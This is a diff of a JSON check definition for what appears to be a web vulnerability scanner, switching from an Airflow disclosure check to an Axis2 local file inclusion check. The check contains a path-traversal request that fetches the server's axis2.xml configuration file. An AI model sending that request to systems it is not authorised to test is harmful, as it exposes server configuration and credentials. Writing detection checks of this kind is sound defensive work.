@@ -1,19 +1,22 @@
 {
-    "id" : "00001",
-    "name" : "Airflow_Information_Disclosure",
-    "desc" : "title=Airflow - DAGs",
+    "id" : "00014",
+    "name" : "Axis2_Local_File_Inclusion",
+    "desc" : "apps=Java",
     "author" : "",
     "version" : "1.0",
-    "references" : [],
+    "references" : [
+        "https://www.exploit-db.com/exploits/12721/"
+    ],
     "request" : {
         "protocols" : ["http", "https"],
         "method" : "GET",
-        "ports" : [8080],
+        "ports" : [80, 443, 8080, 8443],
         "suffixes" : [
-            "/admin/"
+            "/axis2/services/Version?xsd=../conf/axis2.xml"
         ],
         "user-agent" : "",
-        "headers" : {},
+        "headers" : {
+        },
         "auth" : {
             "username" : "",
             "password" : ""
@@ -27,15 +30,9 @@
         "texts" : [
             {
                 "type" : "icontains",
-                "value" : "Airflow - DAGs"
+                "value" :"axisconfig"
             }
         ],
-        "headers" : [
-            {
-                "key" : "",
-                "type" : "",
-                "value" : ""
-            }
-        ]
+        "headers" : []
     }
 }
